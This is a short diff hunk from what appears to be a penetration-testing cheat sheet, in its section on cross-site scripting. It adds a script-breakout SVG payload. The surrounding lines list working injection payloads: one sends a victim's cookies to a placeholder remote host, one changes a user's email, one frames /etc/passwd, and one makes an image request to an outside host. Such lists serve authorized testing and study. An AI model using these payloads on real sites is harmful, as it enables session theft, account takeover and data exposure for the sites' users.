@@ -4136,6 +4136,7 @@ aka JavaScript Injection.
 <script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
 <script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
 <script>user.changeEmail('user@domain');</script>
+</script><svg/onload=alert(0)>
 <iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
 <img src='http://<RHOST>'/>
 ```
